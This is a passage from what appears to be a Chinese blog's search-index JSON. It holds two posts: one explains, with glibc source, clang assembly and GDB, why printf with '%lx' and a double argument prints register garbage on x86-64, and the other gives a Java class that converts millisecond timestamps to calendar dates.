`a` 因为是double类型，所以放在xmm0寄存器。\n\n### 分析\n\n- 先看glibc-2.26中`stdio-common/printf.c`的源码\n\n   ```c\n   int\n   __printf (const char *format, ...)\n   {\n     va_list arg;\n     int done;\n\n     va_start (arg, format);\n     done = vfprintf (stdout, format, arg);\n     va_end (arg);\n\n     return done;\n   }\n   ```\n\n- 可以看到，使用的是stdarg的机制实现可变参数传参。\n\n- 如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参\n\n- 复习一下CSAPP第三章\n\n   {% asset_img p1.png %}\n\n   {% asset_img p2.png %}\n\n- 可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器\n- 那么猜测，这应该是问题所在。printf因为使用的格式化字符串是\"%lx\"所以从通用目的寄存器读取可变参数，但是 `a` 因为是double类型，所以放在xmm0寄存器。\n\n### GDB调试\n\n- 使用 `clang -S d.c &&  clang d.s -g`命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点\n\n- main函数部分汇编代码\n\n  ```assembly\n  subq\t$16, %rsp\n  movabsq\t$.L.str, %rdi\t\t# .L.str就是\"%lx\\n\"\n  movsd\t.LCPI0_0, %xmm0    \t\n  # 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0\n  movsd\t%xmm0, -8(%rbp)\n  movsd\t-8(%rbp), %xmm0        \n  movb\t$1, %al\n  callq\tprintf\n  ```\n\n- 可以看到，double a 确实放在了xmm0,\n\n- 用GDB在 ` callq printf` 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器\n\n  {% asset_img p4.png %}\n\n  （红框内是前四个传参的通用目的寄存器）\n\n- 执行gdb 的`next`指令 ，运行`callq printf`这条指令，检查输出\n\n  {% asset_img p3.png %}\n\n- 可以看到，与`rsi`寄存器的内容一样。可以初步确认，因为格式字符串是\"%lx\"，所以printf在通用目的寄存器读取可变参数\n\n- 手动修改汇编代码，在callq printf之前加上一条`movq $16, %rsi`（注意，此处是十进制，而printf使用的格式字符串是\"%lx\"，所以程序输出的是十六进制）\n\n  ```assembly\n  movabsq\t$.L.str, %rdi\n  movsd\t.LCPI0_0, %xmm0         # xmm0 = mem[0],zero\n  movsd\t%xmm0, -8(%rbp)\n  movsd\t-8(%rbp), %xmm0         # xmm0 = mem[0],zero\n  movb\t$1, %al\n  movq    $16, %rsi \t\t\t\t# 这一条就是加上去的\n  callq\tprintf\n  ```\n\n- 运行，结果是\n\n  {% asset_img p5.png %}\n\n- 符合预期，与rsi寄存器的东西一样\n\n- 分析结果得到证实\n\n### 探究过程出现的一些问题\n\n- 在不合时宜的时刻检查寄存器的值\n  - 执行完`callq printf`后才检查xmm0、xmm1的内容，企图找到double a\n  - 执行完`callq printf`后才检查rdi、rsi的值。\n- 因为printf函数会使用这些寄存器，所以这样检查必然是不行的\n\n### 关于vc++的一些补充\n\n- [Visual Studio 2015的参数传递文档](https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx)\n\n  {% asset_img p8.png %}\n\n  {% asset_img p7.png %}\n\n  ​\t**注意：这里的b不是在xmm0，而是在xmm1，d也是如此**\n\n\n- [Visual Studio 2015 的 Varargs文档 ](https://msdn.microsoft.com//library/dd2wa36c.aspx)\n\n  >  如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。**仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值**\n  >\n  >  if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee's responsibility to dump arguments that have their address taken. **For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.**\n\n- 按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，**比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。**这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。\n\n- 这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）","content":"<h3 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h3>   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang version 3.8.1-24 (tags/RELEASE_381/final)</span><br><span class=\"line\">Target: x86_64-pc-linux-gnu</span><br><span class=\"line\">Thread model: posix</span><br><span class=\"line\"></span><br><span class=\"line\">Linux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)</span><br></pre></td></tr></table></figure>\n<h3 id=\"奇异现象复现\"><a href=\"#奇异现象复现\" class=\"headerlink\" title=\"奇异现象复现\"></a>奇异现象复现</h3><ul>\n<li><p>代码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> a = <span class=\"number\">6.0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%lx\\n\"</span>\t, a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>执行结果</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p6.png\">\n</li>\n<li><p>这段代码用的运行结果是随机的，无规律的，这是非常奇怪的</p>\n</li>\n</ul>\n<h3 id=\"先说原因\"><a href=\"#先说原因\" class=\"headerlink\" title=\"先说原因\"></a>先说原因</h3><ul>\n<li>printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li>\n</ul>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><ul>\n<li><p>先看glibc-2.26中<code>stdio-common/printf.c</code>的源码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span></span><br><span class=\"line\">__printf (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *format, ...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  va_list arg;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_start (arg, format);</span><br><span class=\"line\">  done = <span class=\"built_in\">vfprintf</span> (<span class=\"built_in\">stdout</span>, format, arg);</span><br><span class=\"line\">  va_end (arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以看到，使用的是stdarg的机制实现可变参数传参。</p>\n</li>\n<li><p>如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参</p>\n</li>\n<li><p>复习一下CSAPP第三章</p>\n <img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p1.png\">\n <img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p2.png\">\n</li>\n<li><p>可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器</p>\n</li>\n<li>那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li>\n</ul>\n<h3 id=\"GDB调试\"><a href=\"#GDB调试\" class=\"headerlink\" title=\"GDB调试\"></a>GDB调试</h3><ul>\n<li><p>使用 <code>clang -S d.c &amp;&amp;  clang d.s -g</code>命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点</p>\n</li>\n<li><p>main函数部分汇编代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subq\t$16, %rsp</span><br><span class=\"line\">movabsq\t$.L.str, %rdi\t\t# .L.str就是&quot;%lx\\n&quot;</span><br><span class=\"line\">movsd\t.LCPI0_0, %xmm0    \t</span><br><span class=\"line\"># 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0</span><br><span class=\"line\">movsd\t%xmm0, -8(%rbp)</span><br><span class=\"line\">movsd\t-8(%rbp), %xmm0        </span><br><span class=\"line\">movb\t$1, %al</span><br><span class=\"line\">callq\tprintf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以看到，double a 确实放在了xmm0,</p>\n</li>\n<li><p>用GDB在 <code>callq printf</code> 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p4.png\">\n<p>（红框内是前四个传参的通用目的寄存器）</p>\n</li>\n<li><p>执行gdb 的<code>next</code>指令 ，运行<code>callq printf</code>这条指令，检查输出</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p3.png\">\n</li>\n<li><p>可以看到，与<code>rsi</code>寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数</p>\n</li>\n<li><p>手动修改汇编代码，在callq printf之前加上一条<code>movq $16, %rsi</code>（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movabsq\t$.L.str, %rdi</span><br><span class=\"line\">movsd\t.LCPI0_0, %xmm0         # xmm0 = mem[0],zero</span><br><span class=\"line\">movsd\t%xmm0, -8(%rbp)</span><br><span class=\"line\">movsd\t-8(%rbp), %xmm0         # xmm0 = mem[0],zero</span><br><span class=\"line\">movb\t$1, %al</span><br><span class=\"line\">movq    $16, %rsi \t\t\t\t# 这一条就是加上去的</span><br><span class=\"line\">callq\tprintf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>运行，结果是</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p5.png\">\n</li>\n<li><p>符合预期，与rsi寄存器的东西一样</p>\n</li>\n<li><p>分析结果得到证实</p>\n</li>\n</ul>\n<h3 id=\"探究过程出现的一些问题\"><a href=\"#探究过程出现的一些问题\" class=\"headerlink\" title=\"探究过程出现的一些问题\"></a>探究过程出现的一些问题</h3><ul>\n<li>在不合时宜的时刻检查寄存器的值<ul>\n<li>执行完<code>callq printf</code>后才检查xmm0、xmm1的内容，企图找到double a</li>\n<li>执行完<code>callq printf</code>后才检查rdi、rsi的值。</li>\n</ul>\n</li>\n<li>因为printf函数会使用这些寄存器，所以这样检查必然是不行的</li>\n</ul>\n<h3 id=\"关于vc-的一些补充\"><a href=\"#关于vc-的一些补充\" class=\"headerlink\" title=\"关于vc++的一些补充\"></a>关于vc++的一些补充</h3><ul>\n<li><p><a href=\"https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx\" target=\"_blank\" rel=\"noopener\">Visual Studio 2015的参数传递文档</a></p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p8.png\">\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p7.png\">\n<p>​    <strong>注意：这里的b不是在xmm0，而是在xmm1，d也是如此</strong></p>\n</li>\n</ul>\n<ul>\n<li><p><a href=\"https://msdn.microsoft.com//library/dd2wa36c.aspx\" target=\"_blank\" rel=\"noopener\">Visual Studio 2015 的 Varargs文档 </a></p>\n<blockquote>\n<p> 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。<strong>仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值</strong></p>\n<p> if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. <strong>For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.</strong></p>\n</blockquote>\n</li>\n<li><p>按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，<strong>比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。</strong>这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。</p>\n</li>\n<li><p>这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）</p>\n</li>\n</ul>\n","slug":"printf的一个异常现象引发的对x86-64体系下可变参数传参的探究","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"printf","slug":"printf","permalink":"https://h-zex.github.io/tags/printf/"},{"name":"操作系统","slug":"操作系统","permalink":"https://h-zex.github.io/tags/操作系统/"},{"name":"底层","slug":"底层","permalink":"https://h-zex.github.io/tags/底层/"},{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/tags/CSAPP/"}]},{"title":"从时间戳（毫秒）计算日历","date":"2017-10-02T08:58:15.000Z","path":"2017/10/02/从时间戳（毫秒）计算日历/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116class MyDate &#123; private int year; private int month; private int day; private int hour; private int minute; private int second; private final long timePerSecond = 1000; private final long timePerMinute = 1000*60; private final long timePerHour = 3600*1000; private final long timePerDay = 24*3600*1000; private final long timePerPingNian = 365*timePerDay; private final long timePerLeapYear = 366*timePerDay; private final long timeOf1970And1971 = timePerPingNian+timePerPingNian; private final long timePer4Year = (long)(365.25*4*timePerDay); private final long timeEvery400Year = timePer4Year*100 - 3*timePerDay; private final long timeOf1970To2000 = timePer4Year*7+timeOf1970And1971; private final int[] daysPerMonth = &#123;31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31&#125;; private boolean setMinuteAndSecond(long milliTime) &#123; assert milliTime&lt;timePerDay; if(milliTime&gt;=timePerDay) return false; hour = (int)(milliTime/timePerHour); long t = milliTime%timePerHour; minute = (int)(t/timePerMinute); t = t%timePerMinute; second = (int)(t/timePerSecond); return true; &#125; private boolean setMonthAndDay(long milliTime, boolean isLeapYear) &#123; //this func should handle the case where milliTime == 0; //this func get the milliseconds within 1 year; assert milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear; if(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123; return false; &#125; daysPerMonth[1] = isLeapYear ? 29 : 28; //set the days of February; int cnt = -1; do&#123; milliTime -= daysPerMonth[++cnt]*timePerDay; &#125;while (milliTime&gt;=0); month = cnt+1; //for that the cnt begin from 0, but month begin from 1; long timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime; day = (int)(timeOfLastMonth/timePerDay)+1; setMinuteAndSecond(timeOfLastMonth % timePerDay); return true; &#125; private boolean setDataFile(long milliTime) &#123; if(milliTime&lt;0) return false; boolean is1970Or1971 = milliTime&lt;timeOf1970And1971 ? true : false; boolean is20Century = milliTime&lt;timeOf1970To2000 ? true: false; //if equal is 2000 1 1 0:0:0 if(is1970Or1971) &#123; year = milliTime&gt;=timePerPingNian ? 1971 : 1970; setMonthAndDay(year==1971 ? milliTime-timePerPingNian : milliTime, false); return true; &#125; if(is20Century) &#123; long t = (milliTime-timeOf1970And1971)/timePer4Year; long t1 = milliTime-timeOf1970And1971-t*timePer4Year; long t2 = t1-timePerLeapYear; boolean isLeapYear = t2&lt;0; long t3 = isLeapYear ? 0 : t2/timePerPingNian+1; year = (int)(1972+t*4+t3); long l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay); setMonthAndDay(l, isLeapYear); return true; &#125; long p = milliTime-timeOf1970To2000; long t1 = p/timeEvery400Year; long p1 = p-t1*timeEvery400Year; long t2 = p1/timePer4Year; long tN = t2/25; //in every 400 years, other year such as xy00(y!=0) is not leap year; long p2 = p1-t2*timePer4Year; p2 += tN*timePerDay; long t3 = p2-timePerLeapYear; boolean isLeapYear = t3&lt;0; long t4 = isLeapYear ? 0 : t3/timePerPingNian+1; year = (int)(2000+t1*400+t2*4+t4); long lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay); setMonthAndDay(lt, isLeapYear); return true; &#125;&#125; 思路设置时分秒（函数setMinuteAndSecond） 函数的输入是 小于 每天毫秒数 的一个整数 因为是从0:0:0开始计时，所以很好算 直接除以每小时毫秒数，结果就是 要求的小时数 然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数 以此类推，算出秒数 设置月和日（函数setMonthAndDay） 函数的输入为 小于 每年毫秒数 一个整数 依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59 通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始） 设置年份（在函数setDataFile中） 对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。注意，等于也是，原因如上所述。然后调用setMonthAndDay函数，设置日月 对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。 然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$ 然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$ 接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$ 接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$ 接下来调用setMonthAndDay函数设置月份日期","raw":"---\ntitle: 从时间戳（毫秒）计算日历\ntoc: \ncomments: true\nmathjax: true\ndate: 2017-10-02 16:58:15\ntags:\n- 时间戳\n- 日历\n- 算法\ndescription:\n- 从时间戳（毫秒）计算日历\ncategories:\n- 算法\n---\n\n```java\nclass MyDate {\n    private int year;\n    private int month;\n    private int day;\n    private int hour;\n    private int minute;\n    private int second;\n\n    private final long timePerSecond = 1000;\n    private final long timePerMinute = 1000*60;\n    private final long timePerHour = 3600*1000;\n    private final long timePerDay = 24*3600*1000;\n    private final long timePerPingNian = 365*timePerDay;\n    private final long timePerLeapYear = 366*timePerDay;\n    private final long timeOf1970And1971 = timePerPingNian+timePerPingNian;\n    private final long timePer4Year = (long)(365.25*4*timePerDay);\n    private final long timeEvery400Year = timePer4Year*100 - 3*timePerDay;\n    private final long timeOf1970To2000 = timePer4Year*7+timeOf1970And1971;\n    private final int[] daysPerMonth = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};\n\n    private boolean setMinuteAndSecond(long milliTime) {\n\n        assert milliTime<timePerDay;\n        if(milliTime>=timePerDay)\n            return false;\n\n        hour = (int)(milliTime/timePerHour);\n        long t = milliTime%timePerHour;\n        minute = (int)(t/timePerMinute);\n        t = t%timePerMinute;\n        second = (int)(t/timePerSecond);\n\n        return true;\n    }\n\n    private boolean setMonthAndDay(long milliTime, boolean isLeapYear) {\n\n        //this func should handle  the case where milliTime == 0;\n        //this func get the milliseconds within 1 year;\n\n        assert milliTime<=timePerLeapYear && isLeapYear || milliTime<=timePerPingNian && !isLeapYear;\n        if(milliTime>timePerLeapYear && isLeapYear || milliTime>timePerPingNian && !isLeapYear) {\n            return false;\n        }\n\n        daysPerMonth[1] = isLeapYear ? 29 : 28; //set the days of February;\n\n        int cnt = -1;\n\n        do{\n            milliTime -= daysPerMonth[++cnt]*timePerDay;\n        }while (milliTime>=0);\n\n        month = cnt+1;  //for that the cnt begin from 0, but month begin from 1;\n        long timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;\n        day = (int)(timeOfLastMonth/timePerDay)+1;\n\n        setMinuteAndSecond(timeOfLastMonth % timePerDay);\n\n        return true;\n    }\n\n    private boolean setDataFile(long milliTime) {\n        if(milliTime<0)\n            return false;\n\n        boolean is1970Or1971 = milliTime<timeOf1970And1971 ? true : false;\n        boolean is20Century = milliTime<timeOf1970To2000 ? true: false; \n       \t//if equal is 2000 1 1 0:0:0\n\n        if(is1970Or1971) {\n            year = milliTime>=timePerPingNian ? 1971 : 1970;\n            setMonthAndDay(year==1971 ? milliTime-timePerPingNian : milliTime, false);\n            return true;\n        }\n\n        if(is20Century) {\n            long t = (milliTime-timeOf1970And1971)/timePer4Year;  \n            long t1 = milliTime-timeOf1970And1971-t*timePer4Year;\n\n            long t2 = t1-timePerLeapYear;\n            boolean isLeapYear = t2<0;\n            long t3 = isLeapYear ? 0 : t2/timePerPingNian+1;\n\n            year = (int)(1972+t*4+t3);\n\n            long l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);\n            setMonthAndDay(l, isLeapYear);\n\n            return true;\n        }\n\n        long p = milliTime-timeOf1970To2000;\n\n        long t1 = p/timeEvery400Year;\n        long p1 = p-t1*timeEvery400Year;\n\n        long t2 = p1/timePer4Year;\n        long tN = t2/25;    \n      \t//in every 400 years, other year such as xy00(y!=0) is not leap year;\n        \n      \tlong p2 = p1-t2*timePer4Year;\n        p2 += tN*timePerDay;\n\n        long t3 = p2-timePerLeapYear;\n\n        boolean isLeapYear = t3<0;\n        long t4 = isLeapYear ? 0 : t3/timePerPingNian+1;\n\n        year = (int)(2000+t1*400+t2*4+t4);\n\n        long lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);\n        setMonthAndDay(lt, isLeapYear);\n        return true;\n    }\n}\n```\n\n### 思路\n\n#### 设置时分秒（函数setMinuteAndSecond）\n\n- 函数的输入是 小于 每天毫秒数  的一个整数\n- 因为是从0:0:0开始计时，所以很好算\n- 直接除以每小时毫秒数，结果就是 要求的小时数\n- 然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数\n- 以此类推，算出秒数\n\n#### 设置月和日（函数setMonthAndDay）\n\n- 函数的输入为  小于  每年毫秒数  一个整数\n- 依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。**注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59**\n- 通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）\n\n#### 设置年份（在函数setDataFile中）\n\n- 对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。**注意，等于也是，原因如上所述。**然后调用setMonthAndDay函数，设置日月\n\n- 对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。\n\n  然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$\n\n- 然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$\n\n  接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$\n\n  接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$\n\n  接下来调用setMonthAndDay函数设置月份日期","content":"<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span 